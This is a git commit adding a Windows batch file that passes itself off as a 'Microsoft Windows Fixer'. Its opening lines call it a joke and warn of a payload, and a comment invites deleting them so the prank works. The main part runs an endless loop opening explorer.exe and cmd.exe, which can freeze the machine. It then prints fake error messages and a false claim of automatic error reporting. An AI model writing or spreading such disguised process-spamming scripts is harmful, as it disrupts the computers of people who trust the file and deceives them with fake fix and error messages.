04bf418aec054388650bf31f08e458cc46893a76
BackslashGamerDev <76182635+BackslashGamerDev@users.noreply.github.com>
2020-12-18 20:26:13 -0600

    Create windowsfixer.bat

---
+++ windowsfixer.bat
@@ -0,0 +1,37 @@
+@echo off
+@echo JOKE!
+@title JOKE!
+echo this is a joke thing that "fixes" windows.
+echo this is not real
+color 4 
+echo WARNING: THIS CONTAINS A PAYLOAD THAT SPAM CMD AND EXPLORER, PLEASE EDIT THE CODE IF YOU WOULD NOT LIKE THIS
+color f
+rem DELETE ABOVE ME FOR JOKE
+@echo off
+@title Microsoft Windows Fixer
+@echo Fixes Microsoft Windows issues.
+pause
+echo Please note that this is in beta
+echo Press any key to start
+pause
+:spammer
+rem THIS IS THE VIRUS PART
+rem DLETE ME IF NO BREK
+start C:\Windows\explorer.exe
+start C:\Windows\system32\cmd.exe
+ipconfig
+goto spammer
+echo Fixed!
+pause 
+cmd
+rem @BackslashGamer 
+echo An error has been found in "sysconfig.txt"
+echo Failed to keep fixes, please restart
+echo Error Code: 94343
+echo The error has been automagicly been reported
+echo.
+echo.
+echo.
+pause
+rem aye hello human looking at code, welcome
+rem feel free to add stuff to this payload, it is written in batch
